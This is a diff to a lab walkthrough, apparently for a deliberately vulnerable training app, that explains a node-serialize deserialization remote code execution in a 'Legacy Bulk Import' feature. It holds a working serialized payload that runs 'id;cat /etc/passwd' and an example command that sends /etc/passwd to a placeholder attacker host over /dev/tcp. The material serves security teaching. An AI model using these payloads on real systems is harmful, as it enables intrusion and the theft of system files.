@@ -4,10 +4,22 @@ The `Legacy Bulk Import` feature at http://127.0.0.1:9090/app/bulkproducts?legac
 
 ![jse1](/resources/jse1.png)
 
+To execute code we need to provide a serialized object to the server. The object (as shown below) in this case would be a function that uses the `child_process` library to invoke `bash -c -- \"cat /etc/passwd > /dev/tcp/attacker-ip/nc-port\"`. The function is made into an [Immediately Invoked function Expression (IIFE)](https://en.wikipedia.org/wiki/Immediately-invoked_function_expression) by adding `()` to the end of the function
+
 The following input will trigger the vulnerability
 
 ```
 {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });}()"}
+```
+
+which is the serialized version of
+
+```
+var y = {
+ rce : function(){
+ require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });
+ }(),
+}
 ```
 
 ![jse2](/resources/jse2.png)
